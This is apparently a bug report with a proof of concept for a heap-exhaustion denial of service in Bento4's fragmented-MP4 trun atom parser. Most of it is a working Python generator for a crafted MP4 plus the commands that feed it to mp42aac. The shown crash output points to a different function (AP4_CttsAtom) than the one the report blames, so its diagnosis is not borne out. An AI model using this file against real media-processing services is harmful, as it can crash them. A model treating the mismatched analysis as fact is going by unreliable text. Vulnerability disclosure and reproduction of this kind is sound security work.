## Bug0: AP4_TrunAtom missing sample_count bounds check causes heap exhaustion DoS

In `AP4_TrunAtom::AP4_TrunAtom()` in `Ap4TrunAtom.cpp`, the `sample_count` field read from the bitstream is passed without any validation against the declared atom size to `m_Entries.SetItemCount()`, which attempts to allocate up to `sample_count * 16` bytes on the heap and crashes the process when a crafted MP4 supplies a value of 0xFFFFFFFF.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(btype, data):
    return struct.pack('>I', 8 + len(data)) + btype + data

def build_ftyp():
    data = b'isom' + struct.pack('>I', 0) + b'isom'
    return box(b'ftyp', data)

def build_mvhd():
    creation_time = 0
    modification_time = 0
    timescale = 1000
    duration = 0
    rate = 0x00010000
    volume = 0x0100
    reserved_10 = b'\x00' * 10
    matrix = struct.pack('>9I',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    pre_defined = b'\x00' * 24
    next_track_id = 1
    data = struct.pack('>IIIII', creation_time, modification_time, timescale, duration, rate)
    data += struct.pack('>H', volume)
    data += reserved_10
    data += matrix
    data += pre_defined
    data += struct.pack('>I', next_track_id)
    return box(b'mvhd', data)

def build_moov():
    return box(b'moov', build_mvhd())

def build_mfhd():
    data = b'\x00\x00\x00\x00' + struct.pack('>I', 1)
    return box(b'mfhd', data)

def build_tfhd():
    data = b'\x00\x00\x00\x00' + struct.pack('>I', 1)
    return box(b'tfhd', data)

def build_trun():
    # size=16: header(8) + version/flags(4) + sample_count(4); no optional fields
    # sample_count=0xFFFFFFFF triggers allocation of ~64 GB
    return (struct.pack('>I', 16) +
            b'trun' +
            b'\x00\x00\x00\x00' +
            struct.pack('>I', 0xFFFFFFFF))

def build_traf():
    return box(b'traf', build_tfhd() + build_trun())

def build_moof():
    return box(b'moof', build_mfhd() + build_traf())

def build_mdat():
    return box(b'mdat', b'')

mp4 = build_ftyp() + build_moov() + build_moof() + build_mdat()
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)
print(f"Written {len(mp4)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==596917==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x55f931838094 bp 0x7ffe6957b770 sp 0x7ffe6957b760
READ of size 1 at 0x5020000000f1 thread T0
    #0 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)
Process timed out after 30s (exit code 124). TrunAtom huge allocation (sample_count=0xFFFFFFFF, approx 64 GB) caused DoS/hang.

### Impact

An attacker who can supply a crafted MP4 file to any application that uses Bento4 can trigger an unbounded heap allocation of approximately 64 GB inside `AP4_TrunAtom::AP4_TrunAtom()`, causing the process to be killed by the out-of-memory subsystem or to crash via a null-pointer dereference when the allocator returns NULL. The attack surface covers every invocation of mp42aac or any Bento4-based tool that parses fragmented MP4 input, and no authentication or special permissions are required beyond the ability to provide a file for processing. The only constraint is that the crafted `trun` atom must be reachable inside a `moof/traf` hierarchy, which is a standard fragmented-MP4 structure requiring no special knowledge to construct.
